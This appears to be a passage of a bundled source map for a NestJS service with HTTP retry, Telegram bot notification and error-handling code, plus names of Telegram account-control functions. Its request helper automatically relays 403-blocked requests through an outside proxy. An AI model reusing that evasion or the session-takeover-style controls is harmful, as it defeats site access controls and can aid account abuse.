message prefix\r\n * @param errorDetails - Error details to include in notification\r\n * @param config - Notification configuration\r\n * @returns Promise that resolves when notification is sent\r\n */\r\nasync function notifyInternal(\r\n    prefix: string,\r\n    errorDetails: { message: any; status?: number },\r\n    config: NotificationConfig = DEFAULT_NOTIFICATION_CONFIG\r\n): Promise<void> {\r\n    if (!config.enabled) return;\r\n    prefix = `${prefix} ${process.env.clientId || 'uptimeChecker2'}`;\r\n    try {\r\n        const errorMessage = typeof errorDetails.message === 'string'\r\n            ? errorDetails.message\r\n            : JSON.stringify(errorDetails.message);\r\n\r\n        const formattedMessage = errorMessage.includes('ETIMEDOUT') ? 'Connection timed out' :\r\n            errorMessage.includes('ECONNREFUSED') ? 'Connection refused' :\r\n                extractMessage(errorDetails?.message);\r\n\r\n        console.error(`${prefix}\\n${formattedMessage}`);\r\n\r\n        // Skip notification for rate limiting errors\r\n        if (errorDetails.status === 429) return;\r\n\r\n        const notificationText = `${prefix}\\n\\n${formattedMessage}`;\r\n\r\n        try {\r\n            const channelUrl = ppplbot(process.env[config.channelEnvVar] || '');\r\n            if (!channelUrl) {\r\n                console.warn(`Notification channel URL not available. Environment variable ${config.channelEnvVar} might not be set.`);\r\n                return;\r\n            }\r\n\r\n            const notifUrl = `${channelUrl}&text=${encodeURIComponent(notificationText)}`;\r\n            await axios.get(notifUrl, { timeout: config.timeout });\r\n        } catch (error) {\r\n            console.error(\"Failed to send notification:\", error);\r\n        }\r\n    } catch (error) {\r\n        console.error(\"Error in notification process:\", error);\r\n    }\r\n}\r\n\r\n/**\r\n * Common network errors that should trigger retries\r\n */\r\nconst RETRYABLE_NETWORK_ERRORS = [\r\n    'ETIMEDOUT',\r\n    'ECONNABORTED',\r\n    'ECONNREFUSED',\r\n    'ECONNRESET',\r\n    'ERR_NETWORK',\r\n    'ERR_BAD_RESPONSE',\r\n    'EHOSTUNREACH',\r\n    'ENETUNREACH'\r\n];\r\n\r\n/**\r\n * HTTP status codes that should trigger retries\r\n */\r\nconst RETRYABLE_STATUS_CODES = [408, 500, 502, 503, 504];\r\n\r\n/**\r\n * Determines if an error should trigger a retry\r\n * @param error - The axios error\r\n * @param parsedError - Parsed error with status code\r\n * @returns boolean indicating whether to retry the request\r\n */\r\nfunction shouldRetry(error: unknown, parsedError: { status: number }): boolean {\r\n    if (axios.isAxiosError(error)) {\r\n        if (error.code && RETRYABLE_NETWORK_ERRORS.includes(error.code)) {\r\n            return true;\r\n        }\r\n\r\n        if (error.message?.toLowerCase().includes('timeout')) {\r\n            return true;\r\n        }\r\n    }\r\n\r\n    return RETRYABLE_STATUS_CODES.includes(parsedError.status);\r\n}\r\n\r\n/**\r\n * Calculates backoff time for retry attempts\r\n * @param attempt - Current attempt number (0-based)\r\n * @param config - Retry configuration\r\n * @returns Delay in milliseconds before next retry\r\n */\r\nfunction calculateBackoff(attempt: number, config: RetryConfig = DEFAULT_RETRY_CONFIG): number {\r\n    const base = Math.min(config.baseDelay * Math.pow(2, attempt), config.maxDelay);\r\n    const jitter = Math.random() * (base * config.jitterFactor);\r\n    return Math.floor(base + jitter);\r\n}\r\n\r\n/**\r\n * Makes a request through a bypass service when regular requests fail with certain errors\r\n * @param url - Target URL\r\n * @param options - Request options\r\n * @returns Axios response from bypass service\r\n */\r\nasync function makeBypassRequest(\r\n    url: string,\r\n    options: AxiosRequestConfig & { bypassUrl?: string }\r\n): Promise<AxiosResponse> {\r\n    const bypassUrl = options.bypassUrl || process.env.bypassURL || '';\r\n\r\n    if (!bypassUrl) {\r\n        throw new Error('Bypass URL is not provided');\r\n    }\r\n\r\n    const finalBypassUrl = bypassUrl.startsWith('http') ?\r\n        bypassUrl :\r\n        'https://ravishing-perception-production.up.railway.app/execute-request';\r\n\r\n    const bypassAxios = axios.create({\r\n        responseType: options.responseType || 'json',\r\n        maxContentLength: Infinity,\r\n        maxBodyLength: Infinity,\r\n        timeout: options.timeout || 30000\r\n    });\r\n\r\n    const response = await bypassAxios.post(finalBypassUrl, {\r\n        url,\r\n        method: options.method,\r\n        headers: options.headers,\r\n        data: options.data,\r\n        params: options.params,\r\n        responseType: options.responseType,\r\n        timeout: options.timeout,\r\n        followRedirects: options.maxRedirects !== 0,\r\n        maxRedirects: options.maxRedirects\r\n    }, {\r\n        headers: {\r\n            'Content-Type': 'application/json',\r\n            ...options.headers\r\n        }\r\n    });\r\n\r\n    // Handle binary responses\r\n    if (response && (\r\n        options.responseType === 'arraybuffer' ||\r\n        response.headers['content-type']?.includes('application/octet-stream') ||\r\n        response.headers['content-type']?.includes('image/') ||\r\n        response.headers['content-type']?.includes('audio/') ||\r\n        response.headers['content-type']?.includes('video/') ||\r\n        response.headers['content-type']?.includes('application/pdf'))) {\r\n\r\n        response.data = Buffer.from(response.data);\r\n    }\r\n\r\n    return response;\r\n}\r\n\r\n/**\r\n * Parses a URL and extracts host and endpoint information\r\n * @param url - URL to parse\r\n * @returns Object containing host and endpoint\r\n */\r\nfunction parseUrl(url: string): { host: string; endpoint: string } | null {\r\n    if (!url || typeof url !== 'string') {\r\n        return null;\r\n    }\r\n\r\n    try {\r\n        const parsedUrl = new URL(url);\r\n        return {\r\n            host: parsedUrl.host,\r\n            endpoint: parsedUrl.pathname + parsedUrl.search\r\n        };\r\n    } catch (error) {\r\n        return null;\r\n    }\r\n}\r\n\r\n/**\r\n * Extended options for fetch requests\r\n */\r\ninterface FetchWithTimeoutOptions extends AxiosRequestConfig {\r\n    bypassUrl?: string;\r\n    retryConfig?: RetryConfig;\r\n    notificationConfig?: NotificationConfig;\r\n}\r\n\r\n/**\r\n * Makes HTTP requests with timeout handling and retry logic\r\n * @param url - Target URL\r\n * @param options - Request options with custom extensions\r\n * @returns Promise resolving to Axios response or undefined if all retries fail\r\n */\r\nexport async function fetchWithTimeout(\r\n    url: string,\r\n    options: FetchWithTimeoutOptions = {},\r\n    maxRetries?: number // Kept for backward compatibility\r\n): Promise<AxiosResponse | undefined> {\r\n    // Input validation\r\n    if (!url) {\r\n        console.error('URL is empty');\r\n        return undefined;\r\n    }\r\n\r\n    // Merge default and custom configurations\r\n    const retryConfig: RetryConfig = {\r\n        ...DEFAULT_RETRY_CONFIG,\r\n        ...options.retryConfig,\r\n        maxRetries: maxRetries !== undefined ? maxRetries : (options.retryConfig?.maxRetries || DEFAULT_RETRY_CONFIG.maxRetries)\r\n    };\r\n\r\n    const notificationConfig: NotificationConfig = {\r\n        ...DEFAULT_NOTIFICATION_CONFIG,\r\n        ...options.notificationConfig\r\n    };\r\n\r\n    // Initialize request options with defaults\r\n    options.timeout = options.timeout || 30000;\r\n    options.method = options.method || \"GET\";\r\n\r\n    // Parse URL for error reporting\r\n    const urlInfo = parseUrl(url);\r\n    if (!urlInfo) {\r\n        console.error(`Invalid URL: ${url}`);\r\n        return undefined;\r\n    }\r\n\r\n    const { host, endpoint } = urlInfo;\r\n    const clientId = process.env.clientId || 'UnknownClient';\r\n\r\n    // Main retry loop\r\n    let lastError: Error | null = null;\r\n\r\n    for (let attempt = 0; attempt <= retryConfig.maxRetries; attempt++) {\r\n        // Create controller for this attempt\r\n        const controller = new AbortController();\r\n        const currentTimeout = options.timeout + (attempt * 5000);\r\n\r\n        // Set up timeout to abort the request if it takes too long\r\n        const timeoutId = setTimeout(() => {\r\n            try {\r\n                controller.abort();\r\n            } catch (abortError) {\r\n                console.error(\"Error during abort:\", abortError);\r\n            }\r\n        }, currentTimeout);\r\n\r\n        try {\r\n            // Make the request\r\n            const response = await axios({\r\n                ...options,\r\n                url,\r\n                signal: controller.signal,\r\n                maxRedirects: options.maxRedirects ?? 5,\r\n                timeout: currentTimeout,\r\n            });\r\n\r\n            // Success! Clean up and return response\r\n            clearTimeout(timeoutId);\r\n            return response;\r\n\r\n        } catch (error) {\r\n            // Clean up timeout\r\n            clearTimeout(timeoutId);\r\n\r\n            // Process error and determine if retry is needed\r\n            lastError = error instanceof Error ? error : new Error(String(error));\r\n\r\n            // Try to parse the error for better handling\r\n            let parsedError;\r\n            try {\r\n                parsedError = parseError(error, `host: ${host}\\nendpoint:${endpoint}`, false);\r\n            } catch (parseErrorError) {\r\n                console.error(\"Error in parseError:\", parseErrorError);\r\n                parsedError = { status: 500, message: String(error), error: \"ParseError\" };\r\n            }\r\n\r\n            // Extract message for notifications\r\n            const message = parsedError.message;\r\n\r\n            // Check if it's a timeout\r\n            const isTimeout = axios.isAxiosError(error) && (\r\n                error.code === \"ECONNABORTED\" ||\r\n                (message && message.includes(\"timeout\")) ||\r\n                parsedError.status === 408\r\n            );\r\n\r\n            // Handle 403/495 with bypass\r\n            if (parsedError.status === 403 || parsedError.status === 495) {\r\n                try {\r\n                    const bypassResponse = await makeBypassRequest(url, options);\r\n                    if (bypassResponse) {\r\n                        await notifyInternal(\r\n                            `Successfully Bypassed the request`,\r\n                            { message: `${clientId} host=${host}\\nendpoint=${endpoint}` },\r\n                            notificationConfig\r\n                        );\r\n                        return bypassResponse;\r\n                    }\r\n                } catch (bypassError) {\r\n                    let errorDetails;\r\n                    try {\r\n                        const bypassParsedError = parseError(bypassError, `host: ${host}\\nendpoint:${endpoint}`, false);\r\n                        errorDetails = extractMessage(bypassParsedError);\r\n                    } catch (extractBypassError) {\r\n                        console.error(\"Error extracting bypass error message:\", extractBypassError);\r\n                        errorDetails = String(bypassError);\r\n                    }\r\n\r\n                    await notifyInternal(\r\n                        `Bypass attempt failed`,\r\n                        { message: `host=${host}\\nendpoint=${endpoint}\\n${`msg: ${errorDetails.slice(0, 150)}`}` },\r\n                        notificationConfig\r\n                    );\r\n                }\r\n            } else {\r\n                // Notify about the error\r\n                if (isTimeout) {\r\n                    await notifyInternal(\r\n                        `Request timeout on attempt ${attempt}`,\r\n                        {\r\n                            message: `${clientId} host=${host}\\nendpoint=${endpoint}\\ntimeout=${options.timeout}ms`,\r\n                            status: 408\r\n                        },\r\n                        notificationConfig\r\n                    );\r\n                } else {\r\n                    await notifyInternal(\r\n                        `Attempt ${attempt} failed`,\r\n                        {\r\n                            message: `${clientId} host=${host}\\nendpoint=${endpoint}\\n${`mgs: ${message.slice(0, 150)}`}`,\r\n                            status: parsedError.status\r\n                        },\r\n                        notificationConfig\r\n                    );\r\n                }\r\n            }\r\n\r\n            // Check if we should retry\r\n            if (attempt < retryConfig.maxRetries && shouldRetry(error, parsedError)) {\r\n                const delay = calculateBackoff(attempt, retryConfig);\r\n                console.log(`Retrying request (${attempt + 1}/${retryConfig.maxRetries}) after ${delay}ms`);\r\n                await sleep(delay);\r\n                continue;\r\n            }\r\n\r\n            // If this is the last attempt, break out of the loop\r\n            if (attempt >= retryConfig.maxRetries) {\r\n                break;\r\n            }\r\n        }\r\n    }\r\n\r\n    // If we get here, all retries failed\r\n    try {\r\n        let errorData;\r\n        try {\r\n            if (lastError) {\r\n                const parsedLastError = parseError(lastError, `${clientId} host: ${host}\\nendpoint:${endpoint}`, false);\r\n                errorData = extractMessage(parsedLastError);\r\n            } else {\r\n                errorData = 'Unknown error';\r\n            }\r\n        } catch (extractLastError) {\r\n            console.error(\"Error extracting last error:\", extractLastError);\r\n            errorData = String(lastError) || 'Unknown error';\r\n        }\r\n\r\n        await notifyInternal(\r\n            `All ${retryConfig.maxRetries} retries exhausted`,\r\n            { message: `${errorData.slice(0, 150)}` },\r\n            notificationConfig\r\n        );\r\n    } catch (finalError) {\r\n        console.error('Failed to send final error notification:', finalError);\r\n    }\r\n\r\n    // Return undefined to indicate failure\r\n    return undefined;\r\n}","const getBotTokens = () => {\r\n    const botTokens = (process.env.BOT_TOKENS || '').split(',').filter(Boolean);\r\n    if (botTokens.length === 0) {\r\n        throw new Error('No bot tokens configured. Please set BOT_TOKENS environment variable');\r\n    }\r\n    return botTokens;\r\n};\r\n\r\nlet botTokens: string[] | null = null;\r\nlet currentTokenIndex = 0;\r\n\r\nconst initializeBotTokens = () => {\r\n    if (botTokens === null) {\r\n        botTokens = getBotTokens();\r\n    }\r\n    return botTokens;\r\n};\r\n\r\nexport function getBotToken() {\r\n    return initializeBotTokens()[currentTokenIndex];\r\n}\r\n\r\nexport function notifbot(chatId: string = process.env.accountsChannel || \"-1001801844217\", botToken?: string): string {\r\n    const tokens = initializeBotTokens();\r\n    const token = botToken || tokens[currentTokenIndex];\r\n    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}`;\r\n\r\n    if (!botToken) {\r\n        currentTokenIndex = (currentTokenIndex + 1) % tokens.length;\r\n    }\r\n\r\n    return apiUrl;\r\n}\r\n\r\nexport function ppplbot(chatId: string = process.env.updatesChannel || '-1001972065816', botToken?: string): string {\r\n    const tokens = initializeBotTokens();\r\n    const token = botToken || tokens[currentTokenIndex];\r\n    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}`;\r\n\r\n    if (!botToken) {\r\n        currentTokenIndex = (currentTokenIndex + 1) % tokens.length;\r\n    }\r\n\r\n    return apiUrl;\r\n}\r\n","import { notifbot } from \"./logbots\";\r\nimport axios, { AxiosError, AxiosResponse } from \"axios\";\r\n\r\n/**\r\n * Error response interface for standardized error format\r\n */\r\ninterface ErrorResponse {\r\n  status: number;\r\n  message: string;\r\n  error: string;\r\n  raw?: any;\r\n}\r\n\r\n/**\r\n * Configuration options for error handling\r\n */\r\ninterface ErrorHandlingConfig {\r\n  maxMessageLength: number;\r\n  notificationTimeout: number;\r\n  ignorePatterns: RegExp[];\r\n  defaultStatus: number;\r\n  defaultMessage: string;\r\n  defaultError: string;\r\n}\r\n\r\n// Default configuration for error handling\r\nconst DEFAULT_ERROR_CONFIG: ErrorHandlingConfig = {\r\n  maxMessageLength: 200,\r\n  notificationTimeout: 10000,\r\n  ignorePatterns: [\r\n    /INPUT_USER_DEACTIVATED/i,\r\n    /too many req/i,\r\n    /could not find/i,\r\n    /ECONNREFUSED/i\r\n  ],\r\n  defaultStatus: 500,\r\n  defaultMessage: 'An unknown error occurred',\r\n  defaultError: 'UnknownError'\r\n};\r\n\r\n/**\r\n * Safely stringifies objects of any depth\r\n * @param data - Data to stringify\r\n * @param depth - Current recursion depth\r\n * @param maxDepth - Maximum recursion depth\r\n * @returns String representation of data\r\n */\r\nfunction safeStringify(data: any, depth = 0, maxDepth = 3): string {\r\n  if (depth > maxDepth) {\r\n    return '[Max Depth Reached]';\r\n  }\r\n\r\n  try {\r\n    if (data === null || data === undefined) {\r\n      return String(data);\r\n    }\r\n\r\n    if (typeof data === 'string' || typeof data === 'number' || typeof data === 'boolean') {\r\n      return String(data);\r\n    }\r\n\r\n    if (data instanceof Error) {\r\n      return data.message || data.toString();\r\n    }\r\n\r\n    if (Array.isArray(data)) {\r\n      if (data.length === 0) return '[]';\r\n      return `[${data.map(item => safeStringify(item, depth + 1, maxDepth)).join(', ')}]`;\r\n    }\r\n\r\n    if (typeof data === 'object') {\r\n      const entries = Object.entries(data)\r\n        .filter(([_, v]) => v !== undefined && v !== null)\r\n        .map(([k, v]) => `${k}: ${safeStringify(v, depth + 1, maxDepth)}`);\r\n      \r\n      if (entries.length === 0) return '{}';\r\n      return `{${entries.join(', ')}}`;\r\n    }\r\n\r\n    return String(data);\r\n  } catch (error) {\r\n    return `[Error Stringifying: ${error instanceof Error ? error.message : String(error)}]`;\r\n  }\r\n}\r\n\r\n/**\r\n * Extracts meaningful message from nested data structure\r\n * @param data - The data to extract messages from\r\n * @param path - Current object path for nested values\r\n * @param maxDepth - Maximum depth to traverse\r\n * @returns Extracted message as string\r\n */\r\nexport function extractMessage(data: any, path = '', depth = 0, maxDepth = 5): string {\r\n  try {\r\n    // Prevent excessive recursion\r\n    if (depth > maxDepth) {\r\n      return `${path}=[Max Depth Reached]`;\r\n    }\r\n\r\n    // Handle simple types directly\r\n    if (data === null || data === undefined) {\r\n      return '';\r\n    }\r\n\r\n    if (typeof data === 'string' || typeof data === 'number' || typeof data === 'boolean') {\r\n      return path ? `${path}=${data}` : String(data);\r\n    }\r\n\r\n    // Handle Error objects\r\n    if (data instanceof Error) {\r\n      const errorInfo = [\r\n        data.message ? `message=${data.message}` : '',\r\n        data.name ? `name=${data.name}` : '',\r\n        data.stack ? `stack=${data.stack.split('\\n')[0]}` : ''\r\n      ].filter(Boolean).join('\\n');\r\n      \r\n      return path ? `${path}=(${errorInfo})` : errorInfo;\r\n    }\r\n\r\n    // Handle arrays\r\n    if (Array.isArray(data)) {\r\n      if (data.length === 0) {\r\n        return '';\r\n      }\r\n\r\n      return data\r\n        .map((item, index) => extractMessage(item, path ? `${path}[${index}]` : `[${index}]`, depth + 1, maxDepth))\r\n        .filter(Boolean)\r\n        .join('\\n');\r\n    }\r\n\r\n    // Handle objects\r\n    if (typeof data === 'object') {\r\n      const messages: string[] = [];\r\n\r\n      for (const key of Object.keys(data)) {\r\n        const value = data[key];\r\n        const newPath = path ? `${path}.${key}` : key;\r\n        \r\n        const extracted = extractMessage(value, newPath, depth + 1, maxDepth);\r\n        if (extracted) {\r\n          messages.push(extracted);\r\n        }\r\n      }\r\n\r\n      return messages.join('\\n');\r\n    }\r\n\r\n    // Fallback\r\n    return '';\r\n  } catch (error) {\r\n    console.error(\"Error in extractMessage:\", error);\r\n    return `Error extracting message: ${error instanceof Error ? error.message : String(error)}`;\r\n  }\r\n}\r\n\r\n/**\r\n * Sends an HTTP notification\r\n * @param url - URL to send notification to\r\n * @param timeout - Request timeout in ms\r\n * @returns Promise resolving to response or undefined on error\r\n */\r\nasync function sendNotification(url: string, timeout = DEFAULT_ERROR_CONFIG.notificationTimeout): Promise<AxiosResponse | undefined> {\r\n  try {\r\n    // Validate URL before sending\r\n    if (!url || typeof url !== 'string' || !url.startsWith('http')) {\r\n      console.error(\"Invalid notification URL:\", url);\r\n      return undefined;\r\n    }\r\n\r\n    return await axios.get(url, { \r\n      timeout,\r\n      validateStatus: status => status < 500 // Consider 4xx as \"successful\" notifications\r\n    });\r\n  } catch (error) {\r\n    console.error(\"Failed to send notification:\", error instanceof Error ? error.message : String(error));\r\n    return undefined;\r\n  }\r\n}\r\n\r\n/**\r\n * Checks if an error should be ignored for notification\r\n * @param message - Error message to check\r\n * @param status - HTTP status code\r\n * @param patterns - RegExp patterns to ignore\r\n * @returns Boolean indicating if error should be ignored\r\n */\r\nfunction shouldIgnoreError(message: string, status: number, patterns: RegExp[]): boolean {\r\n  if (status === 429) return true;  // Always ignore rate limiting errors\r\n  \r\n  return patterns.some(pattern => pattern.test(message));\r\n}\r\n\r\n/**\r\n * Extracts status code from error or response object\r\n * @param err - Error object to parse\r\n * @param defaultStatus - Default status code if none found\r\n * @returns HTTP status code\r\n */\r\nfunction extractStatusCode(err: any, defaultStatus: number): number {\r\n  if (!err) return defaultStatus;\r\n\r\n  // Try to extract from response\r\n  if (err.response) {\r\n    const response = err.response;\r\n    return response.data?.statusCode || \r\n           response.data?.status || \r\n           response.data?.ResponseCode || \r\n           response.status || \r\n           err.status || \r\n           defaultStatus;\r\n  }\r\n  \r\n  // Try direct properties\r\n  return err.statusCode || err.status || defaultStatus;\r\n}\r\n\r\n/**\r\n * Extracts error message from error or response object\r\n * @param err - Error object to parse\r\n * @param defaultMessage - Default message if none found\r\n * @returns Extracted error message\r\n */\r\nfunction extractErrorMessage(err: any, defaultMessage: string): string {\r\n  if (!err) return defaultMessage;\r\n\r\n  // Error message from response\r\n  if (err.response?.data) {\r\n    const responseData = err.response.data;\r\n    return responseData.message ||\r\n           responseData.errors ||\r\n           responseData.ErrorMessage ||\r\n           responseData.errorMessage ||\r\n           responseData.UserMessage ||\r\n           (typeof responseData === 'string' ? responseData : null) ||\r\n           err.response.statusText ||\r\n           err.message ||\r\n           defaultMessage;\r\n  }\r\n  \r\n  // Error message from request\r\n  if (err.request) {\r\n    return err.data?.message ||\r\n           err.data?.errors ||\r\n           err.data?.ErrorMessage ||\r\n           err.data?.errorMessage ||\r\n           err.data?.UserMessage ||\r\n           (typeof err.data === 'string' ? err.data : null) ||\r\n           err.message ||\r\n           err.statusText ||\r\n           'The request was triggered but no response was received';\r\n  }\r\n  \r\n  // Direct error message\r\n  return err.message || err.errorMessage || defaultMessage;\r\n}\r\n\r\n/**\r\n * Extracts error type from error or response object\r\n * @param err - Error object to parse\r\n * @param defaultError - Default error type if none found\r\n * @returns Error type as string\r\n */\r\nfunction extractErrorType(err: any, defaultError: string): string {\r\n  if (!err) return defaultError;\r\n\r\n  if (err.response?.data?.error) {\r\n    return err.response.data.error;\r\n  }\r\n  \r\n  return err.error || err.name || err.code || defaultError;\r\n}\r\n\r\n/**\r\n * Parses and standardizes error objects for consistent handling\r\n * @param err - Error to parse\r\n * @param prefix - Prefix to add to error message\r\n * @param sendErr - Whether to send a notification for this error\r\n * @param config - Error handling configuration\r\n * @returns Standardized error response\r\n */\r\nexport function parseError(\r\n  err: any,\r\n  prefix?: string,\r\n  sendErr: boolean = true,\r\n  config: Partial<ErrorHandlingConfig> = {}\r\n): ErrorResponse {\r\n  // Merge with default config\r\n  const fullConfig = { ...DEFAULT_ERROR_CONFIG, ...config };\r\n  \r\n  try {\r\n    const clientId = process.env.clientId || 'UptimeChecker2';\r\n    const prefixStr = `${clientId}${prefix ? ` - ${prefix}` : ''}`;\r\n    \r\n    // Extract error components\r\n    const status = extractStatusCode(err, fullConfig.defaultStatus);\r\n    const rawMessage = extractErrorMessage(err, fullConfig.defaultMessage);\r\n    const error = extractErrorType(err, fullConfig.defaultError);\r\n    \r\n    // Process the raw message to get a clean version\r\n    let extractedMessage;\r\n    try {\r\n      extractedMessage = typeof rawMessage === 'string' ? rawMessage : extractMessage(rawMessage);\r\n    } catch (e) {\r\n      extractedMessage = safeStringify(rawMessage) || 'Error extracting message';\r\n    }\r\n    \r\n    // Prepare the full message for logging\r\n    const fullMessage = `${prefixStr} :: ${extractedMessage}`;\r\n    console.log(\"parsedErr: \", fullMessage);\r\n    \r\n    // Prepare response object\r\n    const response: ErrorResponse = { \r\n      status, \r\n      message: err.errorMessage ? err.errorMessage : String(fullMessage).slice(0, fullConfig.maxMessageLength), \r\n      error,\r\n      raw: err\r\n    };\r\n    \r\n    // Send notification if requested and applicable\r\n    if (sendErr) {\r\n      try {\r\n        const ignoreError = shouldIgnoreError(fullMessage, status, fullConfig.ignorePatterns);\r\n        \r\n        if (!ignoreError) {\r\n          const notificationMessage = err.errorMessage ? err.errorMessage : extractedMessage;\r\n          const notifUrl = `${notifbot()}&text=${encodeURIComponent(prefixStr)} :: ${encodeURIComponent(notificationMessage)}`;\r\n          \r\n          // Use Promise but don't await to avoid delaying the response\r\n          sendNotification(notifUrl, fullConfig.notificationTimeout)\r\n            .catch(e => console.error(\"Failed to send error notification:\", e));\r\n        }\r\n      } catch (notificationError) {\r\n        console.error('Failed to prepare error notification:', notificationError);\r\n      }\r\n    }\r\n    \r\n    return response;\r\n  } catch (fatalError) {\r\n    console.error(\"Fatal error in parseError:\", fatalError);\r\n    return { \r\n      status: fullConfig.defaultStatus, \r\n      message: \"Error in error handling\", \r\n      error: \"FatalError\",\r\n      raw: err\r\n    };\r\n  }\r\n}\r\n\r\n/**\r\n * Type guard for Axios errors\r\n * @param error - Error to check\r\n * @returns Boolean indicating if error is an Axios error\r\n */\r\nexport function isAxiosError(error: unknown): error is AxiosError {\r\n  return axios.isAxiosError(error);\r\n}\r\n\r\n/**\r\n * Creates error objects with consistent format\r\n * @param message - Error message\r\n * @param status - HTTP status code\r\n * @param errorType - Error type\r\n * @returns Standardized error response\r\n */\r\nexport function createError(message: string, status = 500, errorType = 'ApplicationError'): ErrorResponse {\r\n  return {\r\n    status,\r\n    message,\r\n    error: errorType\r\n  };\r\n}\r\n\r\n/**\r\n * Error handling utilities for HTTP requests and responses\r\n */\r\nexport const ErrorUtils = {\r\n  parseError,\r\n  extractMessage,\r\n  sendNotification,\r\n  createError,\r\n  isAxiosError\r\n};","module.exports = require(\"@nestjs/common\");","module.exports = require(\"@nestjs/config\");","module.exports = require(\"@nestjs/core\");","module.exports = require(\"@nestjs/mapped-types\");","module.exports = require(\"@nestjs/mongoose\");","module.exports = require(\"@nestjs/platform-express\");","module.exports = require(\"@nestjs/swagger\");","module.exports = require(\"adm-zip\");","module.exports = require(\"axios\");","module.exports = require(\"big-integer\");","module.exports = require(\"class-transformer\");","module.exports = require(\"class-validator\");","module.exports = require(\"cloudinary\");","module.exports = require(\"imap\");","module.exports = require(\"mongoose\");","module.exports = require(\"multer\");","module.exports = require(\"telegram\");","module.exports = require(\"telegram/Helpers\");","module.exports = require(\"telegram/Password\");","module.exports = require(\"telegram/client/uploads\");","module.exports = require(\"telegram/events\");","module.exports = require(\"telegram/extensions/Logger\");","module.exports = require(\"telegram/sessions\");","module.exports = require(\"telegram/tl\");","module.exports = require(\"crypto\");","module.exports = require(\"fs\");","module.exports = require(\"path\");","// The module cache\nvar __webpack_module_cache__ = {};\n\n// The require function\nfunction __webpack_require__(moduleId) {\n\t// Check if module is in cache\n\tvar cachedModule = __webpack_module_cache__[moduleId];\n\tif (cachedModule !== undefined) {\n\t\treturn cachedModule.exports;\n\t}\n\t// Create a new module (and put it into the cache)\n\tvar module = __webpack_module_cache__[moduleId] = {\n\t\t// no module.id needed\n\t\t// no module.loaded needed\n\t\texports: {}\n\t};\n\n\t// Execute the module function\n\t__webpack_modules__[moduleId].call(module.exports, module, module.exports, __webpack_require__);\n\n\t// Return the exports of the module\n\treturn module.exports;\n}\n\n","// startup\n// Load entry module and return exports\n// This entry module is referenced by other modules so it can't be inlined\nvar __webpack_exports__ = __webpack_require__(7927);\n"],"names":["MailReader","isReady","result","this","imap","user","process","env","GMAIL_ADD","password","GMAIL_PASS","host","port","tls","tlsOptions","rejectUnauthorized","on","console","log","err","error","getInstance","instance","connectToMail","connect","parseError","disconnectFromMail","end","isMailReady","getCode","sleep","openInbox","searchCriteria","fetchOptions","bodies","markSeen","results","Promise","resolve","reject","search","length","fetch","msg","seqno","emailData","stream","info","buffer","chunk","toString","which","push","seq","addFlags","expunge","once","split","fetchNumbersFromString","openBox","AppController","constructor","appService","logger","Logger","getHello","executeRequest","requestDetails","res","requestId","randomUUID","startTime","Date","now","url","method","headers","data","params","responseType","timeout","followRedirects","maxRedirects","message","details","sanitizeHeaders","dataSize","JSON","stringify","response","maxContentLength","Infinity","maxBodyLength","validateStatus","decompress","status","Object","entries","forEach","key","value","toLowerCase","Array","isArray","setHeader","metrics","executionTime","contentType","includes","getHeader","send","Buffer","from","code","stack","json","sensitiveHeaders","reduce","acc","Get","Post","ApiOperation","summary","Body","ValidationPipe","transform","Res","ExecuteRequestDto","Controller","AppService","AppModule","configure","consumer","apply","LoggerMiddleware","forRoutes","Module","imports","initModule","TelegramModule","ActiveChannelsModule","ClientModule","UserDataModule","UsersModule","BufferClientModule","ArchivedClientModule","ChannelsModule","PromoteClientModule","BuildModule","UpiIdModule","PromoteMsgModule","PromoteStatModule","StatModule","Stat2Module","TgSignupModule","TransactionModule","NpointModule","TimestampModule","controllers","providers","exports","Injectable","CloudinaryService","resources","Map","cloudinary","v2","config","cloud_name","CL_NAME","api_key","CL_APIKEY","api_secret","CL_APISECRET","name","getResourcesFromFolder","downloadAndExtractZip","rootPath","cwd","zipPath","path","extractPath","fetchWithTimeout","errorMessage","Error","fs","writeFileSync","zip","extractAllTo","unlinkSync","folderName","createNewFolder","createFolder","uploadFilesToFolder","overwriteFile","uploader","upload","resource_type","overwrite","invalidate","public_id","findAndSaveResources","type","api","prefix","max_results","all","map","async","resource","set","extension","substring","lastIndexOf","mypath","join","statusText","existsSync","saveFile","create_folder","uploadPromises","upload_large","folder","printResources","val","get","publicId","getBuffer","Configuration","Schema","versionKey","autoIndex","strict","timestamps","toJSON","virtuals","doc","ret","_id","ConfigurationSchema","SchemaFactory","createForClass","add","Types","Mixed","ConfigurationController","configurationService","findOne","update","updateClientDto","Patch","ApiBody","ApiTags","ConfigurationService","connection","onModuleInit","clientId","onModuleDestroy","notifbot","encodeURIComponent","closeConnection","close","Global","ConfigModule","forRoot","MongooseModule","forRootAsync","useFactory","uri","mongouri","forFeature","collection","schema","Inject","getConnectionToken","Connection","configurationModel","setEnv","then","BotConfig","ready","OnModuleInit","exec","NotFoundException","updatedUser","findOneAndUpdate","$set","new","upsert","InjectModel","Model","TelegramController","telegramService","mobile","connectionManager","getClient","disconnect","unregisterClient","disconnectAllClients","disconnectAll","getMe","getEntity","entity","updateProfile","updateProfileDto","updateNameandBio","firstName","about","setProfilePhoto","photoDto","setProfilePic","deleteProfilePhotos","getMessages","chatId","limit","sendMessage","dto","forwardMessage","forwardDto","forwardBulkMessages","fromChatId","toChatId","messageIds","processBatchMessages","batchOp","processBatch","items","batchSize","batch","operation","BatchOperationType","FORWARD","item","messageId","DELETE","deleteChat","peer","justClear","BadRequestException","delayMs","searchMessages","queryParams","getChannelInfo","includeIds","forwardMedia","channel","autoDisconnect","handler","leaveChannel","updateUsername","updateUsernameDto","newUsername","setup2FA","set2Fa","updatePrivacy","updatePrivacyBatch","settings","getActiveSessions","getAuths","terminateOtherSessions","removeOtherAuths","createNewSession","getSessionInfo","terminateSession","getConnectionStatus","getCallLogStats","getCallLog","addContactsBulk","contactsDto","addContacts","phoneNumbers","getContacts","sendMedia","sendMediaDto","client","MediaType","PHOTO","sendPhotoChat","caption","filename","sendFileChat","downloadMedia","downloadMediaFile","sendMediaAlbum","albumDto","getMediaMetadata","types","startDate","endDate","minId","maxId","undefined","getFilteredMedia","getGroupMembers","groupId","getGrpMembers","blockChat","blockUser","deleteChatHistory","deleteHistoryDto","sendMessageWithInlineButton","sendInlineMessage","getAllDialogs","offsetId","archived","getDialogs","getLastActiveTime","createGroupWithOptions","options","updateGroupSettings","addGroupMembers","memberOp","members","removeGroupMembers","handleAdminOperation","adminOp","isPromote","promoteToAdmin","userId","p